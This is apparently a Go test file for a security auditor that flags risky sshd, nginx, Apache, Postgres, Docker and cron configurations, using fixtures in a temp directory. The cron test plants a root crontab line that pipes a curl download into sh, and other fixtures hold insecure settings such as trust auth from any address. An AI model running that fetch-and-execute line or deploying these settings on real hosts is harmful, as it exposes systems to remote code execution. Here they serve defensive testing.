package programs

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// etc points every config path into a temp dir and puts an empty PATH in
// place, so no real binary or config is read; bin adds fake binaries.
func etc(t *testing.T) (root string, bin func(name, script string)) {
	t.Helper()
	root = t.TempDir()
	vars := []*string{&sshdConfigPath, &sshdConfigDir, &nginxConfigPath, &postgresGlob, &dockerDaemonJSON, &cronCrontab, &cronAnacrontab, &cronDir}
	for _, p := range vars {
		old := *p
		t.Cleanup(func() { *p = old })
	}
	oldApache := apacheConfigCandidates
	t.Cleanup(func() { apacheConfigCandidates = oldApache })
	sshdConfigPath, sshdConfigDir = filepath.Join(root, "ssh/sshd_config"), filepath.Join(root, "ssh/sshd_config.d")
	nginxConfigPath = filepath.Join(root, "nginx/nginx.conf")
	postgresGlob = filepath.Join(root, "postgresql/*/main/postgresql.conf")
	dockerDaemonJSON = filepath.Join(root, "docker/daemon.json")
	cronCrontab, cronAnacrontab, cronDir = filepath.Join(root, "crontab"), filepath.Join(root, "anacrontab"), filepath.Join(root, "cron.d")
	apacheConfigCandidates = []string{filepath.Join(root, "apache2/apache2.conf")}
	dir := filepath.Join(root, "bin")
	if err := os.MkdirAll(dir, 0o750); err != nil {
		t.Fatal(err)
	}
	t.Setenv("PATH", dir)
	return root, func(name, script string) {
		if err := os.WriteFile(filepath.Join(dir, name), []byte("#!/bin/sh\n"+script), 0o755); err != nil { // #nosec G306 -- test executable
			t.Fatal(err)
		}
	}
}

func file(t *testing.T, path, body string, mode os.FileMode) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o750); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(path, mode); err != nil {
		t.Fatal(err)
	}
}

func subjects(r ProgramResult) string {
	var s []string
	for _, f := range r.Findings {
		s = append(s, f.Subject)
	}
	return strings.Join(s, "\n")
}

func TestAnalyzersSkipWhatIsNotThere(t *testing.T) {
	etc(t)
	ctx := context.Background()
	for p, fn := range analyzers {
		r := fn(ctx)
		if !r.Skipped || r.Reason == "" || len(r.Findings) != 0 {
			t.Errorf("%s with nothing installed: %+v", p, r)
		}
	}
}

func TestAnalyzeSSHD(t *testing.T) {
	root, bin := etc(t)
	file(t, sshdConfigPath, "PermitRootLogin yes\nInclude /etc/ssh/sshd_config.d/*.conf\nMatch User x\n  PasswordAuthentication yes\n", 0o644)
	file(t, filepath.Join(root, "ssh/sshd_config.d/10-local.conf"), "PasswordAuthentication yes\nPermitRootLogin no\n", 0o644)
	ctx := context.Background()
	r := analyzeSSHD(ctx)
	if r.Skipped || !strings.Contains(strings.Join(r.Notes, "\n"), "sshd binary not on PATH") {
		t.Errorf("without sshd the syntax check is skipped: %+v", r)
	}
	// sshd_config.d drop-ins win over the main file (they are Included at
	// its top): PermitRootLogin no there overrides yes here.
	if s := strings.ToLower(subjects(r)); strings.Contains(s, "root") || !strings.Contains(s, "passwordauthentication") {
		t.Errorf("drop-ins take precedence: %s", s)
	}
	_ = os.Remove(filepath.Join(root, "ssh/sshd_config.d/10-local.conf"))
	if s := strings.ToLower(subjects(analyzeSSHD(ctx))); !strings.Contains(s, "root") {
		t.Errorf("without the drop-in the main file's PermitRootLogin yes counts: %s", s)
	}
	bin("sshd", "echo 'sshd: no hostkeys available -- exiting.' >&2; exit 1\n")
	if r := analyzeSSHD(ctx); !strings.Contains(strings.Join(r.Notes, "\n"), "run as root to validate") {
		t.Errorf("a host-key failure is a note, not a finding: %+v", r.Notes)
	}
	bin("sshd", "echo 'line 3: Bad configuration option: Bogus' >&2; exit 255\n")
	if r := analyzeSSHD(ctx); !strings.Contains(subjects(r), "failed syntax check") {
		t.Errorf("a real syntax error is a finding: %s", subjects(r))
	}
	bin("sshd", "exit 0\n")
	if r := analyzeSSHD(ctx); !strings.Contains(strings.Join(r.Notes, "\n"), "sshd -t passed") {
		t.Errorf("passing check: %+v", r.Notes)
	}
}

func TestAnalyzeNginx(t *testing.T) {
	_, bin := etc(t)
	file(t, nginxConfigPath, "server_tokens on;\n", 0o644)
	ctx := context.Background()
	if r := analyzeNginx(ctx); !r.Skipped || !strings.Contains(r.Reason, "not on PATH") {
		t.Errorf("a config without the binary is skipped: %+v", r)
	}
	bin("nginx", "if [ \"$1\" = -T ]; then printf 'autoindex on;\\n'; exit 0; fi\necho 'nginx: [emerg] unknown directive' >&2; exit 1\n")
	r := analyzeNginx(ctx)
	if s := subjects(r); !strings.Contains(s, "failed syntax check") || !strings.Contains(strings.ToLower(s), "autoindex") {
		t.Errorf("-t fails, -T's dump is still checked: %s", s)
	}
	bin("nginx", "if [ \"$1\" = -T ]; then exit 1; fi\nexit 0\n")
	r = analyzeNginx(ctx)
	if s := subjects(r); !strings.Contains(strings.ToLower(s), "server_tokens") || !strings.Contains(strings.Join(r.Notes, "\n"), "falling back") {
		t.Errorf("-T fails: nginx.conf is read instead: %s %v", s, r.Notes)
	}
}

func TestAnalyzeApache(t *testing.T) {
	root, bin := etc(t)
	ctx := context.Background()
	file(t, filepath.Join(root, "apache2/apache2.conf"), "ServerTokens Full\nIncludeOptional conf-enabled/*.conf\n", 0o644)
	file(t, filepath.Join(root, "apache2/conf-enabled/security.conf"), "TraceEnable On\n", 0o644)
	r := analyzeApache(ctx)
	if s := strings.ToLower(subjects(r)); r.Skipped || !strings.Contains(s, "servertokens") || !strings.Contains(s, "trace") {
		t.Errorf("main config and its includes are checked: %s", s)
	}
	bin("apache2ctl", "echo 'AH00526: Syntax error' >&2; exit 1\n")
	if r := analyzeApache(ctx); !strings.Contains(strings.Join(r.Notes, "\n"), "apache -t failed") {
		t.Errorf("-t failure is noted: %v", r.Notes)
	}
	bin("apache2ctl", "exit 0\n")
	if r := analyzeApache(ctx); !strings.Contains(strings.Join(r.Notes, "\n"), "apache -t passed") {
		t.Errorf("-t pass: %v", r.Notes)
	}
}

func TestAnalyzePostgres(t *testing.T) {
	root, _ := etc(t)
	main := filepath.Join(root, "postgresql/16/main")
	file(t, filepath.Join(main, "postgresql.conf"), "listen_addresses = '*'   # all\nssl = off\n", 0o644)
	file(t, filepath.Join(main, "pg_hba.conf"), "# comment\nhost all all 0.0.0.0/0 trust\n", 0o640)
	file(t, filepath.Join(root, "postgresql/15/main/postgresql.conf"), "ssl = on\n", 0o644)
	r := analyzePostgres(context.Background())
	if r.Skipped || !strings.HasSuffix(r.Source, "15/main/postgresql.conf") || !strings.Contains(strings.Join(r.Notes, "\n"), "multiple") {
		t.Errorf("the first of several versions is audited, with a note: %+v", r)
	}
	_ = os.RemoveAll(filepath.Join(root, "postgresql/15"))
	r = analyzePostgres(context.Background())
	if s := strings.ToLower(subjects(r)); !strings.Contains(s, "listen") || !strings.Contains(s, "trust") {
		t.Errorf("postgresql.conf and its sibling pg_hba.conf are checked: %s", s)
	}
	if err := os.Chmod(filepath.Join(main, "pg_hba.conf"), 0o000); err != nil {
		t.Fatal(err)
	}
	if r := analyzePostgres(context.Background()); os.Geteuid() != 0 && !strings.Contains(strings.Join(r.Notes, "\n"), "could not read") {
		t.Errorf("an unreadable pg_hba.conf is noted: %v", r.Notes)
	}
}

func TestAnalyzeDocker(t *testing.T) {
	etc(t)
	file(t, dockerDaemonJSON, "{not json", 0o644)
	if r := analyzeDocker(context.Background()); !strings.Contains(subjects(r), "failed to parse") {
		t.Errorf("bad JSON: %s", subjects(r))
	}
	file(t, dockerDaemonJSON, `{"hosts":["tcp://0.0.0.0:2375"],"live-restore":false}`, 0o644)
	if r := analyzeDocker(context.Background()); len(r.Findings) == 0 || r.Skipped {
		t.Errorf("an exposed TCP socket is reported: %+v", r)
	}
}

func TestAnalyzeCron(t *testing.T) {
	root, _ := etc(t)
	file(t, cronCrontab, "* * * * * root curl http://x.example/a | sh\n", 0o666)
	file(t, cronAnacrontab, "1 5 daily run-parts /etc/cron.daily\n", 0o620)
	file(t, filepath.Join(root, "cron.d/backup"), "0 3 * * * root /usr/bin/backup\n", 0o644)
	if err := os.Symlink("/dev/null", filepath.Join(root, "cron.d/link")); err != nil {
		t.Fatal(err)
	}
	r := analyzeCron(context.Background())
	s := subjects(r)
	for _, want := range []string{"world-writable " + cronCrontab, "group-writable " + cronAnacrontab} {
		if !strings.Contains(s, want) {
			t.Errorf("missing %q in:\n%s", want, s)
		}
	}
	if !strings.Contains(strings.ToLower(s), "http") {
		t.Errorf("a plain-http download in a cron job: %s", s)
	}
}

func TestScanCollectsAndOrders(t *testing.T) {
	etc(t)
	file(t, cronCrontab, "", 0o666)
	r, err := Scan(context.Background(), Options{Programs: []Program{ProgramCron, ProgramDocker, "nope"}})
	if err != nil {
		t.Fatal(err)
	}
	if sk := r.Summary["skipped"].([]string); len(sk) != 2 || sk[0] != "docker" || sk[1] != "nope" {
		t.Errorf("skipped: %v", sk)
	}
	if len(r.Findings) == 0 || r.Kind != "programs" {
		t.Errorf("cron's finding: %+v", r)
	}
	if d := DefaultOptions(); len(d.Programs) != len(AllPrograms) {
		t.Errorf("defaults: %v", d)
	}
	if r, err := Scan(context.Background(), Options{}); err != nil || len(r.Summary["programs"].([]string)) != len(AllPrograms) {
		t.Errorf("no programs means all: %v %v", r, err)
	}
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if _, err := Scan(ctx, Options{}); err == nil {
		t.Error("a canceled scan stops")
	}
}
